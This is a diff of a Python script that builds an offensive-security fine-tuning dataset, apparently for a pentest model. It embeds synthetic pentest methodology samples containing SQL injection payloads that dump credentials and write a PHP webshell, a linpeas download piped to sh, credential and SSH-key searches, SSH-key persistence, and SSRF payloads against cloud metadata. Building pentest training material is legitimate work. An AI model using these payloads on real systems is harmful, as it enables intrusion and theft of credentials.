@@ -1,19 +1,15 @@
 """
-Master Dataset Builder
-Собирает все источники и строит финальный training dataset
+build_master_dataset.py — сборка финального датасета для fine-tune
+Объединяет все источники, фильтрует качество, строит train/val split
 """
 import asyncio
 import json
+import random
 import sys
 from pathlib import Path
 from datetime import datetime
 
-# Add scripts to path
 sys.path.insert(0, str(Path(__file__).parent))
-
-from fetch_mitre import fetch_mitre, build_mitre_samples
-from fetch_hackerone import fetch_hackerone_reports
-from fetch_arxiv import fetch_arxiv_papers
 
 BASE = Path(__file__).parent.parent
 RAW = BASE / "raw"
@@ -23,306 +19,452 @@ for d in [RAW, PROCESSED]:
     d.mkdir(parents=True, exist_ok=True)
 
 
+# ── Loaders ──────────────────────────────────────────────────────────────────
+
+def load_jsonl(path: Path) -> list:
+    if not path.exists():
+        return []
+    with open(path) as f:
+        return [json.loads(l) for l in f if l.strip()]
+
+
+def load_json(path: Path) -> list:
+    if not path.exists():
+        return []
+    with open(path) as f:
+        data = json.load(f)
+    return data if isinstance(data, list) else []
+
+
+# ── Quality filter ────────────────────────────────────────────────────────────
+
+MIN_OUTPUT_LEN = 150   # chars
+MIN_INPUT_LEN = 20
+MAX_OUTPUT_LEN = 4000
+
+TEMPLATE_PHRASES = [
+    "анализ требует изучения",
+    "смотри полный контент",
+    "специфичные для задачи",
+    "определяется из контента",
+    "стандартные python библиотеки",
+]
+
+
+def is_quality_sample(s: dict) -> bool:
+    instruction = s.get("instruction", "")
+    inp = s.get("input", "")
+    output = s.get("output", "")
+
+    if not instruction or not output:
+        return False
+    if len(output) < MIN_OUTPUT_LEN:
+        return False
+    if len(output) > MAX_OUTPUT_LEN:
+        s["output"] = output[:MAX_OUTPUT_LEN]  # truncate, don't discard
+    if len(inp) < MIN_INPUT_LEN and len(instruction) < 50:
+        return False
+
+    # Reject pure template outputs
+    output_lower = output.lower()
+    template_hits = sum(1 for p in TEMPLATE_PHRASES if p in output_lower)
+    if template_hits >= 3:
+        return False
+
+    return True
+
+
+def deduplicate(samples: list) -> list:
+    """Remove near-duplicate samples by instruction+input hash."""
+    seen = set()
+    unique = []
+    for s in samples:
+        key = (s.get("instruction", "")[:80] + s.get("input", "")[:80]).strip()
+        if key not in seen:
+            seen.add(key)
+            unique.append(s)
+    return unique
+
+
+# ── MITRE enrichment (inline, no import needed) ───────────────────────────────
+
+def load_mitre_samples() -> list:
+    """Load MITRE samples if already generated, else return empty."""
+    return load_jsonl(PROCESSED / "mitre_samples.jsonl")
+
+
+# ── Existing processed sources ────────────────────────────────────────────────
+
+def load_all_processed() -> dict[str, list]:
+    sources = {
+        "nvd": load_jsonl(PROCESSED / "nvd_samples.jsonl"),
+        "exploitdb": load_jsonl(PROCESSED / "exploitdb_samples.jsonl"),
+        "ctf": load_jsonl(PROCESSED / "ctf_samples.jsonl"),
+        "mitre": load_mitre_samples(),
+        "github_vuln": load_jsonl(PROCESSED / "github_vuln_samples.jsonl"),
+        "github_repo": load_jsonl(PROCESSED / "github_repo_samples.jsonl"),
+    }
+
+    # Also load old build_dataset.py output if exists
+    old_dataset = PROCESSED / "hexor_full_dataset.jsonl"
+    if old_dataset.exists():
+        old = load_jsonl(old_dataset)
+        # Only take samples with decent output length
+        sources["legacy"] = [s for s in old if len(s.get("output", "")) >= MIN_OUTPUT_LEN]
+
+    return sources
+
+
+# ── Synthetic reasoning samples ───────────────────────────────────────────────
+
+PENTEST_REASONING_SAMPLES = [
+    {
+        "instruction": "Ты проводишь black-box пентест веб-приложения. С чего начать и как выстроить методологию?",
+        "input": "Target: https://target.example.com\nScope: только этот домен и поддомены\nTime: 5 дней",
+        "output": """Black-box пентест методология (5 дней):
+
+День 1 — Разведка (Reconnaissance):
+- Passive: WHOIS, DNS enumeration (subfinder, amass), Shodan/Censys, Google dorks
+- Active: nmap -sV -sC -p- (полное сканирование портов)
+- Web fingerprinting: whatweb, wappalyzer, HTTP headers
+- Directory bruteforce: ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+- SSL/TLS audit: testssl.sh target.example.com
+
+День 2 — Маппинг поверхности атаки:
+- Crawl приложения: spider все endpoints
+- Анализ JavaScript: поиск API endpoints, секретов, логики
+- Аутентификация: регистрация, логин, сброс пароля, 2FA
+- Функционал: загрузка файлов, поиск, фильтры, экспорт
+
+День 3-4 — Активное тестирование:
+- Injection: SQLi (sqlmap), Command injection, XXE, SSTI
+- XSS: reflected, stored, DOM-based
+- Auth: brute force, bypass, session fixation, JWT issues
+- IDOR: перебор ID в параметрах
+- SSRF: внутренние адреса, cloud metadata (169.254.169.254)
+- File upload: обход фильтров, webshell
+- Business logic: race conditions, price manipulation
+
+День 5 — Верификация и отчёт:
+- Подтвердить все находки с PoC
+- Построить attack chains
+- Написать отчёт с severity, evidence, рекомендациями
+
+Приоритет: сначала критические (RCE, SQLi, auth bypass), потом высокие.""",
+        "source": "synthetic",
+    },
+    {
+        "instruction": "Найден SQL injection в параметре id. Как максимально эксплуатировать его?",
+        "input": "URL: https://target.com/user?id=1\nDBMS: MySQL (определён по error message)\nПользователь приложения: app_user",
+        "output": """Эксплуатация SQL injection в MySQL:
+
+# Шаг 1: Подтверждение и определение типа
+# Error-based:
+https://target.com/user?id=1'
+# Boolean-based:
+https://target.com/user?id=1 AND 1=1  (true)
+https://target.com/user?id=1 AND 1=2  (false)
+
+# Шаг 2: Определить количество столбцов
+https://target.com/user?id=1 ORDER BY 1--
+https://target.com/user?id=1 ORDER BY 2--
+# Увеличивать до ошибки
+
+# Шаг 3: UNION-based извлечение данных
+https://target.com/user?id=-1 UNION SELECT 1,2,3--
+# Найти отображаемые столбцы
+
+# Шаг 4: Извлечь данные
+-- Версия и пользователь:
+UNION SELECT version(),user(),database()--
+
+-- Список таблиц:
+UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database()--
+
+-- Столбцы таблицы users:
+UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'--
+
+-- Дампить credentials:
+UNION SELECT username,password,email FROM users--
+
+# Шаг 5: Проверить FILE привилегии
+UNION SELECT LOAD_FILE('/etc/passwd'),2,3--
+
+# Шаг 6: Запись файла (если FILE привилегия есть)
+UNION SELECT '<?php system($_GET[cmd]); ?>',2,3 INTO OUTFILE '/var/www/html/shell.php'--
+
+# Автоматизация через sqlmap:
+sqlmap -u "https://target.com/user?id=1" --dbs --batch
+sqlmap -u "https://target.com/user?id=1" -D target_db --tables
+sqlmap -u "https://target.com/user?id=1" -D target_db -T users --dump
+sqlmap -u "https://target.com/user?id=1" --os-shell  # если есть FILE привилегия
+
+Evidence для отчёта: скриншот UNION SELECT с данными из БД.""",
+        "source": "synthetic",
+    },
+    {
+        "instruction": "Как провести разведку поддоменов и что делать с найденными?",
+        "input": "Target: example.com\nЦель: найти максимальную поверхность атаки",
+        "output": """Subdomain enumeration и дальнейшие шаги:
+
+# Пассивная разведка (без запросов к цели):
+subfinder -d example.com -o subs_passive.txt
+amass enum -passive -d example.com -o subs_amass.txt
+# Certificate transparency:
+curl -s "https://crt.sh/?q=%.example.com&output=json" | jq '.[].name_value' | sort -u
+
+# Активная разведка:
+gobuster dns -d example.com -w /usr/share/wordlists/dns/subdomains-top1million-5000.txt
+# Или:
+ffuf -w wordlist.txt -u https://FUZZ.example.com -mc 200,301,302,403
+
+# Объединить и дедуплицировать:
+cat subs_*.txt | sort -u > all_subs.txt
+
+# Проверить живые хосты:
+httpx -l all_subs.txt -o live_subs.txt -status-code -title -tech-detect
+
+# Что делать с найденными поддоменами:
+1. Subdomain takeover: проверить CNAME на несуществующие сервисы
+   subjack -w all_subs.txt -t 100 -o takeover.txt
+
+2. Старые/забытые сервисы: часто меньше защищены
+   - dev.*, staging.*, test.*, old.*, beta.*
+
+3. API endpoints: api.*, api-v2.*, internal-api.*
+   - Часто без WAF, с debug режимом
+
+4. Admin панели: admin.*, dashboard.*, manage.*
+   - Проверить default credentials
+
+5. Каждый живой поддомен — отдельная цель для полного тестирования""",
+        "source": "synthetic",
+    },
+    {
+        "instruction": "Получен shell на сервере Linux. Опиши post-exploitation методологию.",
+        "input": "Shell: www-data@target (непривилегированный)\nОС: Ubuntu 20.04\nЦель: максимальный impact",
+        "output": """Post-exploitation на Linux (www-data → root):
+
+# Шаг 1: Разведка системы
+id && whoami
+uname -a && cat /etc/os-release
+hostname && ip addr
+cat /etc/passwd | grep -v nologin
+ps aux | grep -v '\[' | head -30
+
+# Шаг 2: Поиск путей для privesc
+# Автоматически:
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+# Вручную:
+# SUID бинари:
+find / -perm -4000 -type f 2>/dev/null
+
+# Sudo права:
+sudo -l
+
+# Cron jobs:
+cat /etc/crontab && ls -la /etc/cron.*
+
+# Writable файлы в PATH:
+find /usr/local/bin /usr/bin -writable 2>/dev/null
+
+# Kernel exploits:
+uname -r  # проверить версию ядра против известных LPE
+
+# Шаг 3: Сбор данных (горизонтальное движение)
+# Конфиги с credentials:
+find /var/www -name "*.php" -o -name "*.env" -o -name "config.*" 2>/dev/null | xargs grep -l "password\|passwd\|secret\|key" 2>/dev/null
+
+# БД credentials:
+cat /var/www/*/wp-config.php 2>/dev/null
+find / -name ".env" 2>/dev/null | xargs cat 2>/dev/null
+
+# SSH ключи:
+find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
+
+# Шаг 4: Persistence (если нужно для демонстрации)
+# Добавить SSH ключ (обратимо):
+echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
+
+# Шаг 5: Документирование
+# Скриншот id=0(root) после privesc — главный evidence""",
+        "source": "synthetic",
+    },
+    {
+        "instruction": "Как обнаружить и эксплуатировать SSRF уязвимость?",
+        "input": "Приложение: веб-сервис с функцией загрузки изображений по URL\nПараметр: ?url=https://example.com/image.jpg",
+        "output": """SSRF — обнаружение и эксплуатация:
+
+# Шаг 1: Подтверждение SSRF
+# Использовать Burp Collaborator или interactsh:
+?url=https://your-collaborator.burpcollaborator.net/test
+# Если получили DNS/HTTP запрос — SSRF подтверждён
+
+# Шаг 2: Определить тип SSRF
+# Blind SSRF: ответ не виден, только side-effects
+# Semi-blind: видим статус код или размер ответа
+# Full SSRF: видим полный ответ
+
+# Шаг 3: Внутренняя сеть
+# Cloud metadata (критично!):
+?url=http://169.254.169.254/latest/meta-data/  # AWS
+?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+?url=http://metadata.google.internal/computeMetadata/v1/  # GCP
+?url=http://169.254.169.254/metadata/instance  # Azure
+
+# Внутренние сервисы:
+?url=http://localhost:8080/admin
+?url=http://127.0.0.1:6379/  # Redis
+?url=http://internal-service:5432/  # PostgreSQL
+?url=http://10.0.0.1/  # внутренняя сеть
+
+# Шаг 4: Bypass фильтров
+# Если блокируют 127.0.0.1:
+?url=http://127.1/
+?url=http://0x7f000001/
+?url=http://2130706433/  # decimal IP
+?url=http://localhost.attacker.com/  # DNS rebinding
+
+# Шаг 5: Протоколы (если не только HTTP)
+?url=file:///etc/passwd
+?url=dict://localhost:6379/info  # Redis commands
+?url=gopher://localhost:6379/_*1%0d%0a...  # Redis RCE
+
+# Impact:
+- AWS credentials → полный доступ к облаку
+- Internal services → lateral movement
+- file:// → LFI
+- Redis/Memcached → RCE через gopher://""",
+        "source": "synthetic",
+    },
+]
+
+
+# ── Main builder ──────────────────────────────────────────────────────────────
+
 class MasterDatasetBuilder:
-    """Orchestrates all data collection and dataset building"""
-    
     def __init__(self):
-        self.stats = {
-            "sources": {},
-            "total_samples": 0,
-            "started_at": datetime.now().isoformat()
-        }
-    
-    async def collect_all_sources(self):
-        """Collect from all sources in parallel"""
+        self.stats: dict = {}
+
+    def build(self) -> list:
         print("=" * 60)
-        print("HEXOR MASTER DATASET BUILDER")
+        print("HEXOR MASTER DATASET BUILDER v2")
         print("=" * 60)
-        
-        tasks = []
-        
-        # CVE (already collected, load from raw)
-        print("\n[1/6] Loading CVE data...")
-        cve_path = RAW / "cve_raw.json"
-        if cve_path.exists():
-            with open(cve_path) as f:
-                cves = json.load(f)
-            print(f"  ✓ {len(cves)} CVEs loaded")
-            self.stats["sources"]["cve"] = len(cves)
-        else:
-            print("  ⚠ No CVE data, run build_dataset.py first")
-            cves = []
-        
-        # ExploitDB (already collected)
-        print("\n[2/6] Loading ExploitDB data...")
-        edb_path = RAW / "exploitdb_raw.json"
-        if edb_path.exists():
-            with open(edb_path) as f:
-                exploits = json.load(f)
-            print(f"  ✓ {len(exploits)} exploits loaded")
-            self.stats["sources"]["exploitdb"] = len(exploits)
-        else:
-            print("  ⚠ No ExploitDB data")
-            exploits = []
-        
-        # MITRE ATT&CK
-        print("\n[3/6] Fetching MITRE ATT&CK...")
-        mitre_techniques = await fetch_mitre()
-        mitre_samples = build_mitre_samples(mitre_techniques)
-        print(f"  ✓ {len(mitre_samples)} MITRE samples")
-        self.stats["sources"]["mitre"] = len(mitre_samples)
-        
-        # HackerOne
-        print("\n[4/6] Fetching HackerOne reports...")
-        h1_reports = await fetch_hackerone_reports(500)
-        print(f"  ✓ {len(h1_reports)} HackerOne reports")
-        self.stats["sources"]["hackerone"] = len(h1_reports)
-        
-        # arXiv
-        print("\n[5/6] Fetching arXiv papers...")
-        papers = await fetch_arxiv_papers(300)
-        print(f"  ✓ {len(papers)} arXiv papers")
-        self.stats["sources"]["arxiv"] = len(papers)
-        
-        # GitHub (from analyze_github.py if exists)
-        print("\n[6/6] Loading GitHub analysis...")
-        gh_path = PROCESSED / "github_repo_samples.jsonl"
-        gh_vuln_path = PROCESSED / "github_vuln_samples.jsonl"
-        github_samples = []
-        
-        if gh_path.exists():
-            with open(gh_path) as f:
-                for line in f:
-                    github_samples.append(json.loads(line))
-            print(f"  ✓ {len(github_samples)} GitHub repo samples")
-        
-        if gh_vuln_path.exists():
-            with open(gh_vuln_path) as f:
-                for line in f:
-                    github_samples.append(json.loads(line))
-            print(f"  ✓ {len(github_samples)} GitHub vuln samples (total)")
-        
-        if not github_samples:
-            print("  ⚠ No GitHub data, run analyze_github.py")
-        
-        self.stats["sources"]["github"] = len(github_samples)
-        
-        # Writeups
-        print("\n[7/7] Loading writeups...")
-        writeups_path = RAW / "writeups_raw.json"
-        if writeups_path.exists():
-            with open(writeups_path) as f:
-                writeups = json.load(f)
-            print(f"  ✓ {len(writeups)} writeups")
-            self.stats["sources"]["writeups"] = len(writeups)
-        else:
-            print("  ⚠ No writeups, run fetch_writeups.py")
-            writeups = []
-        
-        return {
-            "cves": cves,
-            "exploits": exploits,
-            "mitre": mitre_samples,
-            "hackerone": h1_reports,
-            "arxiv": papers,
-            "github": github_samples,
-            "writeups": writeups
-        }
-    
-    def build_training_samples(self, data: dict) -> list:
-        """Convert all raw data into training format"""
-        samples = []
-        
-        # CVE samples
-        for cve in data["cves"]:
-            if cve.get("description"):
-                samples.append({
-                    "instruction": "Проанализируй эту уязвимость. Опиши класс, вектор атаки, impact, и методологию обнаружения при пентесте.",
-                    "input": f"CVE: {cve.get('id')}\nSeverity: {cve.get('severity')}\nCVSS: {cve.get('cvss_score')}\nDescription: {cve.get('description')}",
-                    "output": self._generate_cve_analysis(cve),
-                    "source": "cve"
-                })
-        
-        # ExploitDB samples
-        for exploit in data["exploits"]:
-            if exploit.get("description"):
-                samples.append({
-                    "instruction": "Опиши пошаговый процесс эксплуатации этой уязвимости.",
-                    "input": f"Exploit: {exploit.get('description')}\nType: {exploit.get('type')}",
-                    "output": self._generate_exploit_steps(exploit),
-                    "source": "exploitdb"
-                })
-        
-        # MITRE samples (already formatted)
-        samples.extend(data["mitre"])
-        
-        # HackerOne samples
-        for report in data["hackerone"]:
-            if report.get("summary"):
-                samples.append({
-                    "instruction": f"Как найти уязвимость типа {report.get('weakness')} при пентесте?",
-                    "input": f"Vulnerability: {report.get('weakness')}\nSeverity: {report.get('severity')}\nContext: {report.get('title')}",
-                    "output": self._generate_h1_methodology(report),
-                    "source": "hackerone"
-                })
-        
-        # arXiv samples
-        for paper in data["arxiv"]:
-            samples.append({
-                "instruction": "Какие техники и подходы описаны в этой security research paper?",
-                "input": f"Title: {paper.get('title')}\nSummary: {paper.get('summary')[:500]}",
-                "output": self._generate_paper_insights(paper),
-                "source": "arxiv"
-            })
-        
-        # GitHub samples (already formatted)
-        for sample in data["github"]:
-            sample["source"] = "github"
-            samples.append(sample)
-        
-        # Writeups
-        for writeup in data["writeups"]:
-            if writeup.get("title"):
-                samples.append({
-                    "instruction": "Какие техники и уязвимости описаны в этом bug bounty writeup?",
-                    "input": f"Title: {writeup.get('title')}\nSummary: {writeup.get('summary', writeup.get('description', ''))[:500]}",
-                    "output": self._generate_writeup_analysis(writeup),
-                    "source": "writeups"
-                })
-        
-        return samples
-    
-    def _generate_cve_analysis(self, cve: dict) -> str:
-        return f"""Класс уязвимости: {cve.get('cwe', 'Определяется по описанию')}
-Severity: {cve.get('severity', 'MEDIUM')} (CVSS {cve.get('cvss_score', 'N/A')})
-Вектор атаки: {cve.get('attack_vector', 'NETWORK')}
 
-Описание:
-{cve.get('description', '')[:400]}
+        # Load all sources
+        sources = load_all_processed()
 
-Методология обнаружения при пентесте:
-1. Определить компонент/сервис из описания CVE
-2. Проверить версию через баннеры (nmap -sV, whatweb, HTTP headers)
-3. Если версия уязвима — подтвердить через nuclei с шаблоном {cve.get('id', '')}
-4. При отсутствии готового шаблона — написать кастомный PoC
-5. Задокументировать evidence (скриншоты, логи, вывод инструментов)
+        all_samples = []
 
-Рекомендация: обновить компонент до пропатченной версии."""
-    
-    def _generate_exploit_steps(self, exploit: dict) -> str:
-        return f"""Пошаговая эксплуатация:
-1. Подготовка: определить целевую систему и версию ПО
-2. Доставка payload: использовать вектор {exploit.get('type', 'remote/local')}
-3. Триггер уязвимости: выполнить эксплойт согласно описанию
-4. Верификация: подтвердить получение привилегий/доступа
-5. Post-exploitation: закрепиться, собрать данные
+        for source_name, samples in sources.items():
+            before = len(samples)
+            filtered = [s for s in samples if is_quality_sample(s)]
+            self.stats[source_name] = {"raw": before, "filtered": len(filtered)}
+            print(f"  {source_name}: {before} raw → {len(filtered)} quality")
+            all_samples.extend(filtered)
 
-Инструменты: Metasploit, custom script
-Описание: {exploit.get('description', '')[:300]}"""
-    
-    def _generate_h1_methodology(self, report: dict) -> str:
-        return f"""Методология обнаружения {report.get('weakness', 'уязвимости')}:
+        # Add synthetic reasoning samples
+        all_samples.extend(PENTEST_REASONING_SAMPLES)
+        self.stats["synthetic"] = {"raw": len(PENTEST_REASONING_SAMPLES), "filtered": len(PENTEST_REASONING_SAMPLES)}
+        print(f"  synthetic: {len(PENTEST_REASONING_SAMPLES)} samples")
 
-1. Изучить функционал приложения, связанный с этим типом уязвимости
-2. Определить точки входа (API endpoints, параметры, формы)
-3. Проверить обработку пользовательского ввода — отправить тестовые payload'ы
-4. Проанализировать ответы сервера на признаки уязвимости
-5. При обнаружении — написать PoC и зафиксировать evidence
+        # Deduplicate
+        before_dedup = len(all_samples)
+        all_samples = deduplicate(all_samples)
+        print(f"\n  Deduplication: {before_dedup} → {len(all_samples)}")
 
-Severity: {report.get('severity', 'N/A')}
-Bounty: ${report.get('bounty', 'N/A')}
+        # Shuffle
+        random.seed(42)
+        random.shuffle(all_samples)
 
-Рекомендация: исправить логику обработки в соответствии с best practices."""
-    
-    def _generate_paper_insights(self, paper: dict) -> str:
-        return f"""Ключевые техники из research paper:
+        self.stats["total"] = len(all_samples)
+        return all_samples
 
-{paper.get('summary', '')[:600]}
-
-Применение в пентесте:
-- Изучить описанные техники и инструменты
-- Адаптировать подходы для реальных целей
-- Использовать как референс для новых методологий
-
-Авторы: {', '.join(paper.get('authors', [])[:3])}
-Категории: {', '.join(paper.get('categories', []))}"""
-    
-    def _generate_writeup_analysis(self, writeup: dict) -> str:
-        return f"""Анализ bug bounty writeup:
-
-{writeup.get('summary', writeup.get('description', ''))[:500]}
-
-Ключевые моменты:
-- Изучить методологию автора
-- Понять как была обнаружена уязвимость
-- Применить похожие техники на других целях
-- Обратить внимание на bypass техники
-
-Source: {writeup.get('source', 'Unknown')}
-Link: {writeup.get('link', 'N/A')}"""
-    
-    def save_dataset(self, samples: list):
-        """Save in JSONL format"""
+    def save(self, samples: list):
         ts = datetime.now().strftime("%Y%m%d_%H%M")
-        
-        # Full dataset
-        full_path = PROCESSED / f"hexor_dataset_{ts}.jsonl"
-        with open(full_path, "w") as f:
-            for s in samples:
-                f.write(json.dumps(s, ensure_ascii=False) + "\n")
-        
-        # Train/val split (80/20)
-        split = int(len(samples) * 0.8)
+
+        # Train/val split 90/10
+        split = int(len(samples) * 0.9)
         train = samples[:split]
         val = samples[split:]
-        
+
+        # Save full dataset
+        with open(PROCESSED / f"hexor_dataset_{ts}.jsonl", "w") as f:
+            for s in samples:
+                f.write(json.dumps(s, ensure_ascii=False) + "\n")
+
+        # Save train/val
         with open(PROCESSED / "train.jsonl", "w") as f:
             for s in train:
                 f.write(json.dumps(s, ensure_ascii=False) + "\n")
-        
+
         with open(PROCESSED / "val.jsonl", "w") as f:
             for s in val:
                 f.write(json.dumps(s, ensure_ascii=False) + "\n")
-        
+
+        # Save Alpaca format (for most fine-tune frameworks)
+        alpaca = [
+            {
+                "instruction": s.get("instruction", ""),
+                "input": s.get("input", ""),
+                "output": s.get("output", ""),
+            }
+            for s in samples
+        ]
+        with open(PROCESSED / "train_alpaca.json", "w") as f:
+            json.dump(alpaca[:split], f, ensure_ascii=False, indent=2)
+
         # Stats
-        self.stats["total_samples"] = len(samples)
-        self.stats["train_samples"] = len(train)
-        self.stats["val_samples"] = len(val)
-        self.stats["completed_at"] = datetime.now().isoformat()
-        
+        self.stats.update({
+            "train": len(train),
+            "val": len(val),
+            "built_at": datetime.now().isoformat(),
+        })
         with open(PROCESSED / f"stats_{ts}.json", "w") as f:
-            json.dump(self.stats, f, indent=2)
-        
+            json.dump(self.stats, f, indent=2, ensure_ascii=False)
+
         print(f"\n{'='*60}")
-        print("DATASET BUILT SUCCESSFULLY")
+        print("DATASET READY")
         print(f"{'='*60}")
-        print(f"Total samples: {len(samples)}")
-        print(f"Train: {len(train)}")
-        print(f"Val: {len(val)}")
-        print(f"\nSaved to: {PROCESSED}/")
-        print(f"  - train.jsonl")
-        print(f"  - val.jsonl")
-        print(f"  - hexor_dataset_{ts}.jsonl")
-        
-        print(f"\nSource distribution:")
-        for source, count in self.stats["sources"].items():
-            print(f"  {source}: {count}")
+        print(f"Total:  {len(samples)}")
+        print(f"Train:  {len(train)}")
+        print(f"Val:    {len(val)}")
+        print(f"\nFiles:")
+        print(f"  processed/train.jsonl          ← для fine-tune")
+        print(f"  processed/val.jsonl            ← для evaluation")
+        print(f"  processed/train_alpaca.json    ← Alpaca format")
+        print(f"  processed/hexor_dataset_{ts}.jsonl")
+        print(f"\nSource breakdown:")
+        for src, stat in self.stats.items():
+            if isinstance(stat, dict) and "filtered" in stat:
+                print(f"  {src}: {stat['filtered']}")
 
 
 async def main():
+    # Optionally run fetchers first if data is missing
+    missing = []
+    if not (PROCESSED / "nvd_samples.jsonl").exists():
+        missing.append("fetch_nvd.py")
+    if not (PROCESSED / "exploitdb_samples.jsonl").exists():
+        missing.append("fetch_exploitdb.py")
+    if not (PROCESSED / "ctf_samples.jsonl").exists():
+        missing.append("fetch_ctf.py")
+    if not (PROCESSED / "mitre_samples.jsonl").exists():
+        missing.append("fetch_mitre.py")
+
+    if missing:
+        print(f"⚠ Missing processed data from: {', '.join(missing)}")
+        print("Run these scripts first, or continue with available data.\n")
+
     builder = MasterDatasetBuilder()
-    
-    # Collect all data
-    data = await builder.collect_all_sources()
-    
-    # Build training samples
-    print("\n" + "="*60)
-    print("BUILDING TRAINING SAMPLES")
-    print("="*60)
-    samples = builder.build_training_samples(data)
-    
-    # Save
-    builder.save_dataset(samples)
+    samples = builder.build()
+
+    if not samples:
+        print("\n✗ No samples found. Run fetch_*.py scripts first.")
+        return
+
+    builder.save(samples)
 
 
 if __name__ == "__main__":
